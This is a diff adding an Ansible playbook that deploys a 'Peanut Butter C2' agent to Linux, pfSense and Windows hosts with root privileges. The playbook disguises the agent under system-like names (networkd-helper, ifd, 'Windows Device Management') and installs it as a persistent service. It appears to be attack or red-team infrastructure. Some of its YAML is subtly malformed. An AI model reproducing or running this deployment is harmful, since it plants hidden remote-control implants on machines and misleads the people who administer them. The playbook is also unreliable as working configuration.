@@ -1,0 +1,92 @@
+# deploy.yml
+# Multi-platform deployment for Peanut Butter C2
+
+# -----------------------
+# Linux hosts
+# -----------------------
+- name: Install pbagent on Linux hosts
+  hosts: linux
+  gather_facts: yes
+  become: true
+  tasks:
+
+    - name: Ensure /usr/local/bin exists
+      ansible.builtin.file:
+        path: /usr/local/bin
+        state: directory
+        mode: '0755'
+
+    - name: Copy pbagent binary to Linux hosts
+      ansible.builtin.copy:
+        src: ../bin/linux_amd64/pbagent
+        dest: /usr/local/bin/networkd-helper
+        owner: root
+        group: root
+        mode: '0550'
+
+    - name: Install systemd service for Linux
+      ansible.builtin.command: /usr/local/bin/networkd-helper install
+
+    - name: Enable systemd service for Linux
+      ansible.builtin.systemd:
+        name: networkd-helper
+        enabled: yes
+        state: restarted
+        daemon_reload: yes
+        exec_start: /usr/local/bin/networkd-helper
+
+# -----------------------
+# pfSense / FreeBSD hosts
+# -----------------------
+- name: Install pbagent on pfSense hosts
+  hosts: routers
+  tasks:
+
+    - name: Copy binary to pfSense hosts
+      ansible.builtin.copy:
+        src: ../bin/freebsd_amd64/pbagent
+        dest: /usr/local/bin/ifd
+        owner: root
+        group: wheel
+        mode: '0550'
+
+    - name: Install rc service
+      ansible.builtin.command: /usr/local/bin/ifd install
+      args:
+        creates: /usr/local/etc/rc.d/ifd
+
+    - name: Enable service
+      ansible.builtin.command: sysrc ifd_enable=YES
+
+    - name: Start service
+      ansible.builtin.command: service ifd restart
+# -----------------------
+# Windows hosts
+# -----------------------
+- name: Stop Windows service if running
+  ansible.windows.win_service:
+    name: Windows Device Management
+    state: stopped
+  ignore_errors: yes
+
+- name: Copy binary to Windows hosts
+  ansible.windows.win_copy:
+    src: ../bin/windows_amd64/pbagent.exe
+    dest: C:\Program Files\Windows Device Management\wdm.exe
+    force: yes
+
+- name: Uninstall existing service if present
+  ansible.windows.win_shell: >
+    if (Get-Service -Name 'Windows Device Management' -ErrorAction SilentlyContinue) {
+      Start-Process -FilePath "C:\Program Files\Windows Device Management\wdm.exe" -ArgumentList uninstall -Wait
+    }
+  ignore_errors: yes
+
+- name: Install Windows service
+  ansible.windows.win_shell: >
+    Start-Process -FilePath "C:\Program Files\Windows Device Management\wdm.exe" -ArgumentList install -Wait
+
+- name: Start Windows service
+  ansible.windows.win_service:
+    name: Windows Device Management
+    state: restarted
